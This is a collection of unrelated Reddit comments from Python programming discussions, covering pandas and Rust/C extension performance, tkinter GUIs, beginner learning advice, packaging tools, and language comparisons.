&gt;I'll find or create a definitive list for you. Nice thanks! &gt;I'm not sure what do you mean by filter. The plugins offer action buttons to select which kind of violation type you want to see in the plugin window, for example for Mypy you can filter out the type error, warning or note (see [here](https://github.com/leinardi/mypy-pycharm/blob/master/art/actions2.png) to better understand).

spend less time on boilerplate and more time creating high quality software ;-)
I tried on a dummy file (only the 10 first lines of the 1.8G file), which gives me timings similar to Pandas... Let me post some examples in a notebook so you can try for yourself.
Easy to learn, hard to master.
"Neural networks, but explained intuitively" is practically a Medium subgenre at this point. The hard part isn't understanding how a CNN works at a high level it's understanding how to build, fit, and tune one. I wish more articles got published at that level.

I'm curious to see how you came to this conclusion from this talk, which doesn't even remotely try to give you the idea that OOP is supposed to be useless. He just argues that wrapping everything into classes is kinda dumb.
You are there to learn. Embrace it! We just had an intern who just knew C and he slayed. Go in with an open mindset and don't worry about looking stupid, that won't happen. Ask questions, learn, have a good time.
Here's the notebook with the timings: [https://gist.github.com/egpbos/e9c064d66ee217a1258684cf877c5af2](https://gist.github.com/egpbos/e9c064d66ee217a1258684cf877c5af2)
One of my favorite packages!
Check out r/learnpython
By the way, not trying to excuse my lack of idiomatic knowledge, but I wrote the code and article in about a day, altogether (plus some editing). I wrote it mostly because I was pleasantly surprised at how quick and easy it is to write such a C++ package. I'm sure you can tell me of many ways it could be done better, would love to hear that, I always struggle getting non-trivial data into Pandas.
What’s stopping you? :)
I saw you posted below you’re using C# now, but I think C#/Winforms is a great intro to basic GUI concepts. Java Swing isn’t as evil as people think, either. 
hey there, wondering if you've found a good way to review/accept PRs for anki decks. 
Nice benchmarks. Though I feel like the operations you might be interested in afterwards are also going to be fast in pure python ;) Just keep going pure python :-) E.g. taking a mean you could do very quickly using a dict comprehension. Do you have an example of an operation we want to do with the data so we can compare the total :)? 
What do you mean by potentially malicious?
Since you've got Idle it's safe to say you've installed Python. But if you're at 'the c:\ prompt' and python --version gives an error it's because the python executable isn't on your path.
I highly recommend the YouTube channel 3blue1brown. He mainly makes beautiful intuitive animations explaining mathematical concepts but he also has series on other things like neural networks.
This is highly impressive. I've been doing some python on and off for a total of maybe two or three years, and I've almost never even read about making GUIs with Python
Start from your interests or personal needs. The best project is something you can actually use. Can't find a program for something? Build it. Or maybe you could make an existing program better for your personal needs? For example: I needed a simple program to keep up with my expenses. I only wanted a simple way to add and view expenses via terminal, nothing more. So I made it, just for me. 
Thank you, sorry for not realizing the difference between these subreddits.
Look into 'tkinter', it's surprisingly easy. 
I have only one complaint. .editorconfig is in my opinion rude way to force style. If someone break your style you can point it when pull request come. 
Yeah exactly, the reading part is 8x faster than the complete C++ operation, including reading and reordering :) But point well taken, perhaps pure Python could get us further still. So perhaps I have two issues in my general approach: 1. too high expectations of what Pandas should be able to do and 2. too little faith in pure Python's speed :) My use case so far has been data exploration. Simple things like histograms etc, just to check out what's actually in this data. No concrete examples yet, because I've been busy with other things since writing the post.
Hi u/MikeTheWatchGuy. I have made a few changes since the original post but to answer your Qs: -The grey-out is done by running an event **"&lt;Button-1&gt;"** through a function. The function then changes the **Button**'s **button.config()** to change the colours, whether its the **bg='colour'**, **fg=**, **activebackground=** or **activeforeground=**.

Hi pal, sorry to bother you but im still having trouble connecting to the Bitstamp feed. Any chance you would be willing to help out? 
If you have available memory and have your OS configured to use virtual memory/swapfiles... this should generally work. It might be slow, and it might thrash to disk a lot, but it *should* work. Without knowing more about the specific error or how you triggered it, I'd only be guessing. As a general rule, if you can find a way to *stream* your operation, so you only need a handful of individual images in memory at once, it's going to work better.
So why are people promoting Conda when we have Pip?
Well I started programming in Java and built most of the GUI in JavaFX, then I started learning Python and haven't gone back. I then started with Tkinter, but I wasn't a fan of how unpythonic it is. I know some HTML and CSS so I thought doing a web app would be a good project, but after trying Flask and Django I changed my mind about that. (mostly because of JS...) Now my current version is in Qt using PySide2 and it's going quite well.

Python is easy to pick up, youll be fine. And huge modules like pandas are written in a very pythonic way that make it seem part of the standard library
What values are you changing the buttons to when disabled? Do you set the font to grey instead of white? &amp;#x200B; I'm not yet aligned down to the pixel level that way you are, so more tweaking to do.

Sure, what errors are you getting?
I have just got round to parsing the data from bitstamp and I ran the script however nothing was returned. Ive added some logging and it appears init_crypto_api() is called but nothing else. Must be something to do with the connection but no trace to point at what is going on. 
Try the app SoloLearn. Lessons take less than 5 minutes. 
Thanks I do have sololearn on my phone. Yet again still struggling to find time in day to day life to start anything. 
To write such articles, the authors would need to have the necessary knowledge 😉
Try waking up a bit earlier than normal. Do it first thing when you wake up, or after a glass of water. You’ll shoot yourself in the foot getting started with a new habit in any other way. With no one to push you but yourself you’ll have to rely only on willpower. Willpower depleted quickly over the course of the day with work and a child, but if you use it first thing in the morning you’ll be able to start your new habit. After 30 days or so it should become easier. Doing it daily is the key, and having an app on your phone (like HabitBull) helps to keep yourself accountable, and motivated by long streaks. Just try it.

Hey, I started a few months ago with python aswell, but most programs I make are just a few lines of code that I execute in the power shell, may I asks how you made the ui?
another thing to look into for massive data sets is either dask or large ec2 instances
I browsed through the rest of the article and it seems pretty cool, I was just thrown off by the fact that misusing pandas will indeed be slow, but the meat of the article is really how simple it is to create a c++ lib for python. 
Python's really easy to learn! You may even find that it's way nicer to use than Java. I was an absolute beginner when I first started in my lab and got into the groove really quickly. As with any language, the internet is your friend. 
You can try PySide2, it's the officially supported library. It's available under GPL, LGPL and commercial licenses.
I made the GUI using pythons built-in **tkinter**. It's surprisingly easy to use. There's plenty of info on the web but [this is the first video guide](https://www.youtube.com/watch?v=RJB1Ek2Ko_Y&amp;t=3s) I came across. I made the GUI first and then built the functioning code into it after.

The other replies have pointed to some good resources that are well worth looking into. If you want to write good Python code (or any language, for that matter), read good code - in Python, the flask library is great for this task. Reading code, however, is hard - sometimes you don't have the background knowledge to understand what the code is doing and sometimes you haven't been writing code long enough to easily read and understand code. If you find yourself in the latter situations - my advice is to just write code. Solve problems and build things - ignore the "me's" of the world talking about style; you'll get there on your own :)
What is BLAS? 
Basic Linear Algebra Subprograms It's what allows programs to do fast operations on large arrays
Very kind of you but from what I have seen of your PySimpleGUI documentation, I struggle to imagine you could learn anything from me on Python! First I made the button: stopButton = Button(root, text="Stop", bg="black", fg="gray33", activebackground="grey25", activeforeground="grey90", width=12, borderwidth=2, relief="ridge", font=bFont) stopButton.bind("&lt;Button-1&gt;", stopTimer) stopButton.grid(row=4, column=1, sticky=N+S+E+W) then I passed the event through a function. The follorwing code in the function change the font colour: stopButton.config(fg="white") Taking that further, as someone on this post suggested, I changed the **start** and **stop** button to swap places with each other in a more recent revision. This means I only need 3 buttons for [start, stop, reset, submit]. This is done using **.lower()** and **.lift()** in the same process.
Thanks! Indeed, it was basically a write down of my experiences... that in the end led me to write the C++ module :)
Indeed, this performs a lot better and I reckon that this has made it the de facto idiomatic approach. However, it makes use of the NumPy backend (by being vectorized, indeed). But worse: I have to repeat the word \`df\` three times! That's at least one time too many for my tastes ;) Joking aside, I would have liked it if Pandas were able to somehow automatically convert an \`apply\` (or similar) call to a vectorized operation.
Will definitly check it out thanks!
He means the program shold notice you are no longer using your computer and you probably left the clock running by mistake.
Hate to break it to you, but you aren't going to find more time between now and your kid in college.
Hey a repo I contributed to! Cookiecutter Data science is a great way to get a project going. Just waiting on the owners to approve a pull request which contains a sample project end to end.
I dunno, once he hits 1 or 2 he'll be a little more independent. 
Oh wow your first program at this kinda level, really good stuff! Keep it up OP. :)
Oh right, thanks for clearing that up. I hadn't considered it. However, the nature of my work means I can be away from my laptop for long periods of time (e.g. speaking with the support engineers), I would want it to continue running. The program only writes the data to the file *if* you click **submit** so worst case scenario, it continues from **start** and I just click **reset** when I return. 
Yes, and no. Where they use only 3 numeric values as in 2.7.10, it's supposed to be compatible with semver as stated in PEPs. In reality they add weird shit like 3.8.a5-gamma-9 (non-real example), but only core devs need to know that.
Maybe around 3, but are you stopping at 1? I have 3 kids, 5/3/1.5, going to school full time, working full time. It is a challenge, but gotta find the time when you can. What about while on lunch at work? Just a couple minutes a day.
I found that I got through a certain amount of code academy then I needed a project to work on to motivate me. So I picked some little things I wanted to do and worked on those as a reason to keep learning 
If you want to make your program safer, make it regularly dump the data to a temporary file and move it to the final destination on submit or delete it is the user declines saving. That way if your program or your computer crashes you don't lose the data. It's becoming the standard way to do it.
You're right I do intend to have at least 1 more child. And I'm usually still answering emails and phone calls at my desk during my lunch. 
I'm learning python now as well and would be interested in hearing some comments. I went through the same thing while learning javascript, trying to come up with projects to practice. I built a few mini games and did a ton of online challenges. Now I'm going to rewrite my JS programs in python and build a web scraper, but short of that I'm lacking in the idea department. 
Can this work (or be tweaked) for Windows?
Okay, I get it. It makes sense. F codes can be categorized as info I guess. W and E are already categorized. A nice setting would be 'ignored codes'. It can be in your flake8 ini or command line args but plugins can have global settings across projects. 
&gt;I needed a project to work on Maybe the same will happen to me eventually, I'd appreciate it if you could share any project intended for beginners
no github repo? :( would be nice to learn. I m new to coding too.
Useless, self promoting article. Love their products but this is a waste of space.
I agree. You’ll probably find that Java has prepared you for picking up python easily. Picking up a second language is easier than learning the first one. So you’ve done most of the hard stuff already! 
I had some not critical work related things I used. I've done some things like making a note taking app or other simple app. Think of a problem you want to solve no matter how simple or ridiculous it may seem to write code to solve it and work on that. The point is not to make the next great app but find motivation to keep coding. 
Get cracking on your product! I have a "problem" where when learning something, eventually I reach a sort of break-even point where the new knowledge has got my mind racing and I'm itching to use it, and continued learning becomes more and more frustrating as my mind wanders and it seems harder to consume despite the difficulty of the topic remaining roughly constant. The key is to embrace that itch and do something practical with your learning, even if it's not for your end-goal (though it could be), *alongside* the core learning. Remember when you were at school? You didn't have Maths for two weeks, followed by English for two weeks, and so on. It was broken-up into bite-sized lessons. Then within those lessons, it was further broken-up - you'd learn about something, you'd do something practical using that knowledge, and do something on your own with homework that week. Then, quite importantly, you'd let that knowledge *rest* - let your subconscious work on it, chew things over, fit the pieces together. Right now I've decided I want to really understand Machine Learning as I think it's really interesting, is strongly related to some of my hobby subjects (AI, Distributed systems, and parallel processing), and is key to my career (webdev). At the same time I want to refresh my webdev skills, and learn the things that are new since I last did it professionally. So for example, I've broken ML down into two main threads (I do break it down further, but the principle stands).. * Core - The maths involved to truly understand ML. I started right back at basic statistics, working through everything in-turn. * Practical - Using tools like scikit-learn to learn about the practicalities of using machine learning, when it's usable, and using knowledge I've gained in the core thread, etc. Then along-side that I'm learning other things, and doing other practical projects - some very tightly related (e.g. performance optimisation in Python) some not so much on the surface (e.g. creating a MUD) - but all designed to push towards my end goal in some way. So I've got sort of a time-table of sessions, which I largely stick to (sometimes I lose track of time on something). I'm finding it works really well.. I'm always excited to do any particular session, and I love mulling-over them in-between - it's surprising just how much you gain from that time.
Thanks for the suggestion. Have you got any pointers/links on this? 
Intrinsic motivation and discipline is something no one can give you. Without professional experience to go off of the 'market' as you say has nothing to compare your skills to. You'll need to create proof of your skills the same same as say an architect or artist has a portfolio. Maybe start with an idea, your own or find some code or application that works and try to replicate the functionality using your own implementation without copy/pasting their code. Break it down into small bits, track your work through a GitHub repo and use issues as a basic project management tool to build out those small bits. If you're working on your code and notice a bug, create an issue so you can track your work and continue to flesh out the project while working on it. Follow a git flow completely as if you were working on production code. Have at least two branches and utilize pull requests. Learning a new language is only the first step towards being a developer. Show people that you not only know a language but also know how to utilize version control, project management, and can see a complete project through from inception to production. Look into doc comments, type hinting, git flow strategies, agile methodologies, utilize an ssh key and sign your commits with gpg, and learn some testing. Documentation in code, on a wiki, and readme can help you pick up where you left off. As an engineer I often use several languages, sometimes I learn a new one just to fix something someone wrote forever ago. You will always learn on the job as needed to complete projects, even in your primary language. If you want to be marketable for an entry level position it's less about domain specific knowledge and more about having basic developer skills. It's likely that you will not be in a role where some senior engineer is doing the analysis and assigning some small coding task. Even in large organizations you will most likely be engaging in all aspects of development. There is no 'one quick trick'. Start with one thing, check it off the list, and move on to the next.
also, one other thing, perhaps slightly pedantic: all idioms are de facto.
Doesnt load
No one's going to mention QT?
Pick some book on python and read half of chapter every day, read documentation on python.org, learn a new library every day and try to implement something in that library/framework. If it's a small library, stay with it for a day or two, if it is larger library try to learn it for few days. So you would make habit of not jumping around a lot, thinking that you know something. Most important thing, keep interest in what you are doing. It's not that we are lazy to do something, it's just that our goals not motivate us to do it.
It depends what you’re logging. If it’s software I’m writing, I’d put a time stamp in utc, state of the process, and the message. If there’s a trace back log that too. Every time you put a print statement to debug something, it should be a debug logline. If you have to troubleshoot it as the developer, you’re going to troubleshoot it again for a consumer, might as well make it verbose.
Check out Apache arrow/parquet via pyarrow. You can load straight into pandas dataframe. I've used it myself for multi destination ETL extracting 56 billion records a day into disparate analytics platforms. Nice post with performance comparison. http://wesmckinney.com/blog/python-parquet-multithreading/ 
Not much code to give feedback on, but it runs well, so great job! I'd recommend trying to fiddle with the win32api (assuming you're running windows) to try and make it event-based, so you don't have to check every tenth of a second for the clipboard content. It will certainly improve the program imo, and will give you some time to read and practice other libraries and different approaches. Good luck!
How can you tell if someone is using tabs instead of spaces in the pull request?

I have thought about making something similar but with JIRA intigration instead of a CSV. very nice work
As someone who had marked code tests, I can assure you that conda gives environment control that pip simply does not. For junior programmers who pip install whatever they need, it's super easy to miss a dependency. This isn't the only time it's useful, obviously. Just springs to mind.

Thanks, in that case I would agree that Cairocffi is likely the best bet when performance is if the essence.
Is it even CS? It seems like math and statistics. The cs part for me is more the cloud infrastructure , data I/O at massive scale. I've struggled to grok these things via tutorials. Think we need the base conceps first and the math. I will check out the YouTube linked above for sure!
It’s coding with objects and yes, python is a objected oriented language like java and c++. There’s too much to talk about it to be explained here, there are thousands of guides or tutorials for this. Some people find this better than functional programming, I think it’s kinda preference but knowing at least the basics is a must.
Not python3 though...

Ill need to give it a shot! Thanks!
We actually implemented this in our organization's internal software. Though ours is Microsoft based stack. But what we realized was that some people weren't being totally honest with their time usage and we subsequently had to track activities on a computer to decide whether the system is idle or not. This was needed as we required transparent and accurate billing for our clients. Ha, 3 downvotes for no reason. :D
That's interesting. I suppose our engineer time is easily accountable via the time's relationship with tickets. This, on the other hand, doesn't necessarily have any accountability element other than our client's trust. Something to think about... I suspect this would be sufficient in our case, however, I will ponder. A key design principle in this is that it requires the *minimum* amount of engagement time to use (so that it isn't overly cumbersome for minor quick activities), therefore adding references/evidence may not be the best approach.
Interesting, thanks, will check it out!
Don't worry it's the exact same thing most people who work with POS systems on a daily basis think. 
Why shell? We've been migrating more and more shell scripts to python. Bash is a bad programming language.
Brush up on some basics, why not.
We made it pretty comprehensive internally as we started using BI tools with such softwares to drive more productivity. A big part of our work is when engineers work, they use internet to resolve challenges as well. We ended up creating an entire suite where we started tracking the urls they visited and leverage BI to classify their work time as "learning" and made our own understanding of what references they used, and on what part of the project did they felt they were most stuck. We were able to pinpoint and locate where exactly they were struck and what reference they used to solve that challenge. At the end, we changed our internal training programs and incorporated this information to make them laser precise. 
Wow, very cool project!
amazing 
Can I ask what the application is (does it have to be quantitative?)? And if you have any sample data sets that you can share (to see the form of your samples and how detailed they are)? &amp;#x200B; Both of these could change the answer to your question significantly.
Not to discourage you, I think that the other posters have it mostly right that python will be easy to pick up if you already know Java, and I don't disagree. One thing to be wary of, however, is applying java solutions to python problems. For example, something I see all the time from Java turned python developers is looping over a list by incrementing an index variable. It's something you do in almost every java program, but you don't need to at all in python. Similarly, over valuing private fields when making python classes. In Java the done thing is to have private variables exposed with getters. In Python it's more or less safe to just allow access to the variables - no need for getters (I'm on mobile so pm me if you want me to go into why this is true)

And not so subtle either...

A list element cannot be accessed before it exists, so initialise correctGuess to the right length with all spaces ` correctGuess = [' ' for _ in range(len(password))]` and set the matching element using the index [i].

Off the top of my head, you could use a list comprehension; something like reply="".join([i[0] if i[0] == i[1] else "X" for i in zip(entered,phrase)]) Consider something other than X. Password might be all X'es for all we know ;-) Doing this from mobile so didn't check but it should be fairly ok :-p
you can “google” the pricing for compute for all the cloud vendors. You can more easily experiment different instances and optimize size. Here is the kicker: if your code can handle interruption signals, you can use AWS spot instance for a fraction of the full cost.

It's recommendations like this that make me wonder what on earth Google is doing with their recommendation engine in YouTube - it is such a terrible platform for content discovery. How has a channel with over a million subscribers that covers topics that I frequently (almost daily!) watch videos on not made it into my feed, while some random nonsense often makes it through (though it's rare these days for it to show me anything outside my subscribed channels)? I guess that's an interesting unsolved problem to work on!
Can you elaborate on why someone should use C instead?
Why not an assembler instead? 
Wow dudes - minus 9 votes on my comment 
C is a compiled language and Python is an interpreted language. You just compile your code and it is converted in to something that a computer is capable of reading, you compile it once (for that type of machine) and then it runs quickly because the computer can always read the compiled program file at low-level. Python is an interpreted language, meaning that it is compiled at run-time, and compiled EVERY time (the advantage of this is that you don't need to compile your code thus eliminating a step in the development process that can sometimes be lengthy), the drawback of this is that it typically runs a bit slower. Will delete this answer if it is wrong, or at least someone correct me if it is.
Good point Rust is the only moral option. 
You'll be fine. I assume Java is harder to grasp than python so having crossed that hurdle I think it's more important to understand the paradigms of python and how they differ from other languages including C and Java. An indispensable resource on this matter is Raymond Hettinger. If you follow his generally simple advice you may find that you will have a superior python understanding than some of your colleagues! The following video is a great place to start. (https://youtu.be/OSGv2VnC0go)[https://youtu.be/OSGv2VnC0go]
Rust could be used to make libraries that require performance (which is often done in C), but rust is generally slower than C so in general it makes very little sense to use Rust. Also, Rust fans love to try to push for things to be done in rust and they're pretty annoying about it. 
Using a microscope camera we are taking images of a round tool (think drill bit). The idea being that taking multiple images with slightly different focus, we can stack them the get one in focus image which we can use to analyse its quality. As for samples, I’ll see if I can get them off the university server from home. 
Python really isn't ever compiled; it is interpreted at run-time. There's a wide gap between interpreting and compiling. Compilation implies quite a bit more from an operation standpoint, and at the end, you'd end up with a binary that could potentially be executed on a bare-metal cpu. Sure Python does produce an ast and a "compiled" python op code in the form of a '.pyc' file, but that's not a true compilation like you'd find with C. Rust, like C, is also compiled. Rust, like C, is statically typed, though there's a macro system that can do some pretty amazing (crazy?) things. I think the question still stands: Why use C instead [of Rust]? The answer here might be something like: * Python's reference implementation is written in C * Python has a C-API * C is ubiquitous * C doesn't make you build the entire house virtually before pounding the first nail. I'm sure there's more. Rust has its own set of advantages, but that wasn't really the question here.
Marginal safety improvements. Most safety issues are from bad code, which no language can stop, and people not understanding proper practices. Rust only fixes a few of these problems, which the whole "Rewrite it in Rust" crowd doesn't like.

I don't know but if this was a popular topic I think sorting by controversial would show you the fun things.
Python enums can have class methods, so you can put that information inside a dictionary behind a property, like this from enum import Enum class Shape(Enum): TRIANGLE = 'triangle' SQUARE = 'square' @property def number_of_sides(self): return num_sides[self] num_sides = { Shape.TRIANGLE: 3, Shape.SQUARE: 4, } print(Shape.TRIANGLE.number_of_sides) I don't love this because it splits the information up, but it's the most compact way I've figured out of doing it. Note that you can move the dictionary inside the function if you want, but it will incur a small runtime cost. The dictionary values could of course be members of another enum if you so desire.
the numpy version OP posted was really nice import numpy as np def count_double_numpy(val): ng=np.fromstring(val,dtype=np.byte) return np.sum(ng[:-1]==ng[1:]) It's clean and vectorized. Just about as fast as Rust.
The only problem I would see is why use say Rust over C or even Fortran? Both have pretty good Python interfaces and odds are if you are offloading into a lower level language from Python you care more about number crunching than say flow management. It's not to say Rust can't do the job, just I don't see much of an advantage to using it while at the same time it comes with the disadvantage that fewer people in those domains likely know the language. Which creates a problem when it comes to maintainability. 
More mature, larger community for C than Rust.
C has lots of footguns, but writing a c module for cpython (the standard Python interpreter) has double extra footguns. Beyond all the issues that any typical C program has (leaks, pointers, etc), you must also be extra careful and follow all the rules to a T or your module will crash or leak memory. In particular, the APIs to interact with the Python garbage collector are tricky. &amp;#x200B; That's why I think higher-level safe language like Rust would be a good choice here. If the environment can maintain invariants like pointer safety, thread safety, and proper cleanup, you can focus more on the application logic. &amp;#x200B; Source: I help maintain an open source Python module partially written in C.
&gt;Sure Python does produce an ast and a "compiled" python op code in the form of a '.pyc' file, but that's not a true compilation like you'd find with C. But that is true compilation in the general sense. Generating bytecode from source is still compiling even if it runs in a VM and not right on the processor. It's not as fast as a language compiled to machine code of course, but it's compilation by definition. Python would be a lot slower if it was actually interpreted as is line by line, and it compiling to bytecode is a major improvement. C has its place of course. C and C++ are both great languages that will never go away, but Rust has really filled a gap that no other language has yet. It's a low level language that can be compiled with no runtime and can be used to make operating systems like C, it's fast like C and it compiles to true machine code, but it's way more expressive and reads and writes like a high level language and it's guaranteed memory safe which is huge. I've written an HTTP REST client with Rust and it was surprisingly easy and wasn't nearly as hard as it'd be with C or C++. It's always going to be more of a question about the team you're working with and what their skills are and what they're willing to learn anyway. If everyone knows C, use C. If memory-safety is a huge concern and a memory corruption vulnerability is a disaster, consider Rust or have C experts that know how to use tools like valgrind. People who aren't experts with C or Rust might prefer Rust in a situation like that, because it'd just be cheaper to do some light Rust work than write some bad C. Rust isn't that hard to learn, and it's not the end of the world if you don't master it before writing something useful. Writing bad C can be a huge problem. Rust is an amazing language and deserves to rise up in the ranks IMO. People should be considering it more, especially in situations like this where a python developer might need to drop to a lower language for performance reasons. Writing a small Rust module is really not hard and it's nice to know you aren't putting any new memory corruption vulnerabilities in production, but you're still improving performance drastically. But if you look at some Rust patterns, especially stuff like error handling and pattern matching, it's an amazing language with a high level feel even though it can do everything low level languages can.

That is a problematic reasoning. It's equivalent of everyone just browsing the top page because it has higher quality posts. Someone needs to browse the new page, even if it might be worse than the top page. Otherwise things stagnate.
RedHat confirmed for starting the EEE cycle against Python.
Are you a bot? That was so... poised for keywords... and looks baity. OP: see what you’ve started!!
Well, I can safely say that Rust is easier to master than C. In a few weeks you will be productive and won't have to spend years developing the sixth sense that unsafe languages like C require. No need to worry about undefined behaviour, data races, memory leaks, dangling or wild pointers. You get to just do your job. And yes, these things do matter if you're interfacing with CPython.
Nobody's telling you to rewrite numpy! It's really great and you should definitely favour it over writing something in C or Rust. However, if you find a bottleneck in some library (maybe yours), it might help to step down a level and rewrite that performance sensitive code in one of these other languages :)
“But C is ugly and hard”
Similar problem to a lot of package manager (e.g. npm, gem). Mitigate this by always installing to a virtual environment.

You're writing a few functions to call from Python, not building an operating system. Rust is a lot more complex than C. 
Then use D. Or Haxe. Or Vala. Or Genie. 
But that's why we're supposed to use Python - because everyone's using Python. That's why Larry Wall and Yukihiro Matsumoto cry themselves to sleep at night and why Julia is turning into Romeo and Julia... Python has the critical mass. It's called the [network effect](https://en.wikipedia.org/wiki/Network_effect). For instance - an auction website comes along that's better than eBay. However, you post your auction on eBay anyway because there are three people total browsing that other auction site. Skype is... Skype, but most people use Skype because everyone else they know is using Skype and it doesn't matter how good another piece of software is if no one they want to call is using it.
**Network effect** A network effect (also called network externality or demand-side economies of scale) is the positive effect described in economics and business that an additional user of a good or service has on the value of that product to others. When a network effect is present, the value of a product or service increases according to the number of others using it.The classic example is the telephone, where a greater number of users increases the value to each. A positive externality is created when a telephone is purchased without its owner intending to create value for other users, but does so regardless. Online social networks work similarly, with sites like Twitter and Facebook increasing in value to each member as more users join. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/Python/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.28
One of the contributors to D put it this way about Rust: &gt; Reading any amount of Rust code evokes the joke "friends don't let &gt;friends skip leg day" and the comic imagery of men with hulky torsos &gt;resting on skinny legs. Rust puts safe, precise memory management front &gt;and center of everything. Unfortunately, that's seldom the problem domain, &gt;which means a large fraction of the thinking and coding are dedicated to &gt;essentially a clerical job (which GC languages actually automate out of &gt;sight). Safe, deterministic memory reclamation is a hard problem, but is &gt;not the only problem or even the most important problem in a program. &gt;Therefore Rust ends up expending a disproportionately large language &gt;design real estate on this one matter. It will be interesting to see how Rust &gt;starts bulking up other aspects of the language; the only solution is to &gt;grow the language, but then the question remains whether abstraction can &gt;help the pesky necessity to deal with resources at all levels.

Hi, im just new to all of this and i need to ask, what is turtle ??
&gt;i'm surprised there is relatively less use of it. I think it's probably because that describes flask pretty well, which is more popular. The syntax of CherryPy looks a bit better than flask though.
I mean you can do most of what you need with some very basic C. Don't need to worry about pointer assignments and such. Usually a simple pass by reference function and maybe an allocate statement at worst. Most of the trouble with C comes from when you have to write general purpose code, OSes, etc. But for simple self-contained functions it's pretty easy to get a C function working. 
It is a module that gives Python the ability to draw turtle graphics which are based on the old LOGO programming language. Here is [an introductory video on the subject](https://www.youtube.com/watch?v=pxKu2pQ7ILo).
Sorry, but this is absolute nonsense.
&gt; I assumed that since Python doesn't naturally supports abstract classes the idea of a Gender class would be unpythonic. https://docs.python.org/3/library/abc.html
The idea of something being "Pythonic" is so sought after and such a horrible idea at this point, well, the best advice I could give is to rip out "Understanding Python by Dr J. Evans Python, PhD" from your Python textbooks. Just replace "perfection", "importance", and "greatness" with "ease of understanding", "simplicity", and "Pythonicism". https://youtu.be/LjHORRHXtyI
Or: just use Julia (half a year from now).
&gt; then it's probably simpler to just fake it. Duck typing has all kinds of benefits in testing. Thanks for the answer :) I will try to mock it first, but I think making fake implementation looks more elegant.
Yes, I know that article. I come here just to dig the reason behind choices out there. :)
&gt; That keeps breaking the mocks and it's not worth spending time on it wow, thank you for comprehensive answer. :) Sure, if the internal always changed, we have to make changes to mock. I think making fake implementation would be more elegant.

This worked. Thanks.
One thing worth mentioning is easy dependency management. Rust has cargo, which lets you pull in and statically link all sorts of 3rd party libraries. So you have a head start on any complicated logic you want to run, like parallelism etc. And when you compile it, you get your whole module in a self-contained package. Compared to C - I don't think anyone would argue that C's dependency management situation is "good", and if you're doing anything nontrivial you'lll likely end up telling your users "also, manually install this 3rd party dependency".
oh, I was adjusting the json file to make Windows and Linux paths match :(
This would have been an argument *against* python when I started using it. It's still kind of an argument against python - if that's what you care about you should probably be using Java or something. I've actually been thinking of learning Rust because it seems to fit the same kind of niche Python used to - better than its obvious competitors, good docs, a decent sized user base, enthusiastic community etc.
My only problem with this solution is that the PyO3 module is poorly documented at the moment. I wrote a Rust module for Python and it was tough.
When you are writing multithreaded computation heavy solver, rust's race free features are more compelling than C's appearant simplicity.

Just use Nim https://github.com/yglukhov/nimpy # mymodule.nim - file name should match the module name you're going to import from python import nimpy proc greet(name: string): string {.exportpy.} = return "Hello, " &amp; name &amp; "!" and # test.py import mymodule assert(mymodule.greet("world") == "Hello, world!")

&gt; Almost certainly, resizing arrays dynamically many times while reading the file only once would be far more costly, so it is worth it. I do strongly disagree with that statement. Reading a file twice is an overhead in O(n), i.e. it scales linearly with the size of the input file. On the other hand, when you append data to a vector, that vector may have to resize, that's also O(n). But vectors grow exponentially (e.g. the total capacity doubles each time the vector has to be resized). That means that reallocations get rarer and rarer with time. It can be shown, that this leads to an [amortized constant overhead](https://en.wikipedia.org/wiki/Amortized_analysis). So while a benchmark will be the ultimate truth, I'm pretty sure that the dynamic resizing is the faster alternative.

Thank you for sharing this, seems pretty interesting. 
Remind me again, what are the important features of Rust?
I've had a lot of success speeding up modules with Cython
They hit 1.0 very recently, so packages are in the process of updating to be compatible. In a few months or less (I’ve already seen a bunch of packages I’ve been using hit compatibility) most things will be good to go.
I actually just played with Julia over a year ago, and tole myself I'll continue once 1.0 comes out— are Plots and DataFrames 1.0 ready?
Very interesting point... I really have some other work to do right now, but I may take you up on that benchmark challenge later next week :) Of course, if you like, you could do it yourself, the code is on GitHub and I'd be happy to take PRs. Above is also a gist with benchmarks, you could use that as well (I should have included it in the module's repo, will do later).
I don't get the "use XXX" here. Of course as a generality it's better to use a more mature tool (in this case C or Cython), but the post is titled "Speed up your Python using Rust" so it's targetted at people who wants to use rust with python. 
Back in the day we used to joke that they thing you would press the most while developing in C and assembler was the reset key lol!
Was just reacting to your fate format, why store it as an int? I guess it's fine now as we are past 2010 but if the year starts with a 0 you are losing out on the first year digit. 2008/08/08 for example would get stored as 80808 instead of 080808.
I read something about 1.0 and am suoer excited about it. The last time I toyed with Julia there were more ways to represent missing values, and each package had its own favourite way of doing things — that was ultimately the reason I decided to have a pause and return later when things settle down a bit. It seems that we'll be able to use whatever language we want for many of our project in college, and I'd love to use Julia from now on!
The [matplotlib gallery](https://matplotlib.org/gallery.html) has a *large* collection of example graphs snd the code that produces them.

Rust package management and quality of interfaces for most common tasks is much better. Let us remind ourselves that C is a language of half a century ago and still has no good package management solution. It is quite legitimately easier to install rust and add some dependencies than install many C libraries 
You don't tell your users to install your dependencies. You install them for them. And that's why "easy" dependency management is a 100% non-starter for me. I'm not making each of my users understand every single one of these "easy" installation systems to get all my multi-language dependencies installed. Either the OS Just Has It or I supply it.
Righto, supply that baby for all of the Linux zoo. With Rust and Python you don't have to...
Why not nim?
Safe and productive Rust is easy, safe and productive C is ... so far it just isn't.
I used [pyd](https://pyd.readthedocs.io/en/latest/) for the D language and it was the easiest Python native module programming I've ever do. Classes, dynamic arrays, hashtables, classes, and a good chunk of the library are automatically translated to Python automatically. It also installs the distutils part as a Python module with pip so configuration is also minimal.

&gt; The only problem I would see is why use say Rust over C or even Fortran? Both have pretty good Python interfaces and odds are if you are offloading into a lower level language from Python you care more about number crunching than say flow management. Baseline rust is type and memory safe, it also provides high-level constructs (e.g. actual iterators), and has an excellent dependency management story.
thats a very good catch. Thank you.
Since we are taking about charts, this PyCon talk by Jake gives a brief about different kinds of charts available in Python. https://youtu.be/FytuB8nFHPQ
systemd is not spyware. And what do you mean by communism as a service?
Yes, the Java Virtual Machine uses a technique called just-in-time compilation, which will increase performance in some cases, at the cost of very increased memory consumption. Another popular Python implementation called PyPy uses JIT compilation as well (although it doesn't use nearly as much memory, as far as I know).
